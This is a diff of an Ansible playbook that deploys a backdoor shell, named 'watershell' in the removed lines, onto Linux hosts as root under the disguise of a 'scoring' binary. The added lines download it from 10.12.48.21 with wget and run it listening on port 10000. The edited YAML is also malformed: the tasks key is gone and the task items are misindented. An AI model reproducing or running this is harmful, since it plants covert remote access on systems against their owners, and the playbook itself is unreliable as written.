@@ -1,14 +1,9 @@
-- hosts: debianNTP/DNS:ubuntuWeb
+- hosts: linux
   become: true
+  become_method: enable
   ignore_errors: true
-  tasks:
-    - name: Copy watershell
-      ansible.builtin.copy:
-        src: /home/kali/zonifer/bins/scoring
-        dest: /usr/bin/scoring
-        owner: root
-        group: root
-        mode: '0777'
-    - name: Run watershell
-      ansible.builtin.command: /usr/bin/scoring
-
+  - name: "Run a shell command on a remote host"
+    shell: wget 10.12.48.21/scoring -O /tmp/scoring; sleep 10
+  - name: "Run a shell command on a remote host"
+    shell: /tmp/scoring -p 10000
+  
